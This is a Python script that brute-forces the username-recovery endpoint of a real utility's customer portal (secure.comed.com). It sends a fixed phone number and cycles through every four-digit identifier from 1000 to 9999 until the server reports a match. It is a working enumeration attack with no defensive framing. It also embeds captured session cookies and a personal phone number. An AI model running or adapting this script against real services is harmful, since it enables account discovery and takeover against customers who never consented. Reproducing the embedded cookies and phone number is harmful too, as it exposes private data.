import requests

cookies = {
    "ASP.NET_SessionId": "dvc4ctk0hhoplcjrrilpfjci",
    "ARRAffinity": "25818f7a4137a42c02225abe913505506469b332b78b4cd6eaadab368c5b6fb3",
    "ARRAffinitySameSite": "25818f7a4137a42c02225abe913505506469b332b78b4cd6eaadab368c5b6fb3",
    "OpenIdConnect.nonce.d3LKW5lO36H6t0T3buDWcPi7yXk4a%2Fqynr4%2F6hTCA2M%3D": "RHF2T3JIOHU2YWJsemVrVTRQUTg5RXo3MDBNVkQ0QUh6WENiMjdYWkF1Z09KVXNKNllFdTBqVEFxclhfM0FqdzVoNjc2UXlhSVdjZ2pDc2YySkRUcnZWY283SEhnV1I0V1FlZjJQVEJ1RFNYVE5pdC1pb2RlLVVDVGhWYmREeTZwQ2NfQVI4WUc5aWlCaU10R01oalJ6TnR1R2IzQWRDVFpqNVQ5ZTJkSFpFTWFUN1ZZekNIZUs2R2VBaExYSVdHSW5zb0VtaFdXTUdLTDJyT0JSdWg5RXQtampB",
    "OpenIdConnect.cv.jGQIez8bpL6VhaDy4Gu5789BnrQIOPCVFa6vXg5uiXM%3D": "Z2JyS2UzbzhzYVRvN09ZcXp1WjNGX1JBRW4tc3IxYlRIc2kxNFlaOW9aLWZfNnY4UVY3cXBDVFFrcTlTUmMtdEdfWVZXY1EwWmNsbWtmRFhLV3hmWEphQ1hxbGVRZFhpSGF3TWs0VWJrd0l5VE5sOWN6T2pTZUZicUdzNHhWbUpiY3owcFE%3D",
    "ASLBSA": "00034369094243ccdcfdbb303529d469b3eadb09a236ee54c2359218c17cc4ce3323",
    "ASLBSACORS": "00034369094243ccdcfdbb303529d469b3eadb09a236ee54c2359218c17cc4ce3323",
    "ai_user": "cyniFDuZbB0h71b/hTp9sh|2024-08-15T22:26:30.367Z",
    "ai_session": "AsnEaSyDYVJviEHD1MG15l|1723760790432|1723760790432",
}

headers = {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "no-cache",
    "content-type": "application/json",
    # 'cookie': 'ASP.NET_SessionId=dvc4ctk0hhoplcjrrilpfjci; ARRAffinity=25818f7a4137a42c02225abe913505506469b332b78b4cd6eaadab368c5b6fb3; ARRAffinitySameSite=25818f7a4137a42c02225abe913505506469b332b78b4cd6eaadab368c5b6fb3; OpenIdConnect.nonce.d3LKW5lO36H6t0T3buDWcPi7yXk4a%2Fqynr4%2F6hTCA2M%3D=RHF2T3JIOHU2YWJsemVrVTRQUTg5RXo3MDBNVkQ0QUh6WENiMjdYWkF1Z09KVXNKNllFdTBqVEFxclhfM0FqdzVoNjc2UXlhSVdjZ2pDc2YySkRUcnZWY283SEhnV1I0V1FlZjJQVEJ1RFNYVE5pdC1pb2RlLVVDVGhWYmREeTZwQ2NfQVI4WUc5aWlCaU10R01oalJ6TnR1R2IzQWRDVFpqNVQ5ZTJkSFpFTWFUN1ZZekNIZUs2R2VBaExYSVdHSW5zb0VtaFdXTUdLTDJyT0JSdWg5RXQtampB; OpenIdConnect.cv.jGQIez8bpL6VhaDy4Gu5789BnrQIOPCVFa6vXg5uiXM%3D=Z2JyS2UzbzhzYVRvN09ZcXp1WjNGX1JBRW4tc3IxYlRIc2kxNFlaOW9aLWZfNnY4UVY3cXBDVFFrcTlTUmMtdEdfWVZXY1EwWmNsbWtmRFhLV3hmWEphQ1hxbGVRZFhpSGF3TWs0VWJrd0l5VE5sOWN6T2pTZUZicUdzNHhWbUpiY3owcFE%3D; ASLBSA=00034369094243ccdcfdbb303529d469b3eadb09a236ee54c2359218c17cc4ce3323; ASLBSACORS=00034369094243ccdcfdbb303529d469b3eadb09a236ee54c2359218c17cc4ce3323; ai_user=cyniFDuZbB0h71b/hTp9sh|2024-08-15T22:26:30.367Z; ai_session=AsnEaSyDYVJviEHD1MG15l|1723760790432|1723760790432',
    "opco": "ComEd",
    "origin": "https://secure.comed.com",
    "priority": "u=1, i",
    "referer": "https://secure.comed.com/accounts/credential-retrieval/find-account",
    "request-id": "|a64ab782b314409193d6cb8c5dee2a37.8d793b6aadac4f53",
    "sec-ch-ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "traceparent": "00-a64ab782b314409193d6cb8c5dee2a37-8d793b6aadac4f53-01",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
    "x-opco": "ComEd",
}

json_data = {
    "account_number": "",
    "phone": "9176505132",
    "identifier": "1011",
    "zip_code": "",
}

response = requests.post(
    "https://secure.comed.com/.euapi/mobile/custom/anon/ComEd/recover/username",
    cookies=cookies,
    headers=headers,
    json=json_data,
)

# expected response:
# Failure:
# {"success":false,"meta":{"code":"FN-ACCT-NOTFOUND","description":"Account not found.","context":"8e63d5f0-5b55-11ef-9493-edf5c55884af"}}


# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
# data = '{"account_number":"","phone":"9176505132","identifier":"1011","zip_code":""}'
# response = requests.post(
#    'https://secure.comed.com/.euapi/mobile/custom/anon/ComEd/recover/username',
#    cookies=cookies,
#    headers=headers,
#    data=data,
# )

import time

url = "https://secure.comed.com/.euapi/mobile/custom/anon/ComEd/recover/username"

for identifier in range(1000, 10000):
    time.sleep(0.5)

    json_data["identifier"] = str(identifier).zfill(4)

    response = requests.post(
        url,
        cookies=cookies,
        headers=headers,
        json=json_data,
    )


    if response.status_code == 200:
        response_data = response.json()
        if response_data.get("success", False):
            print(f"Success with identifier: {identifier}")
            break
    else:
        print(f"Error with identifier {identifier}: Status code {response.status_code}")

print("Loop completed")
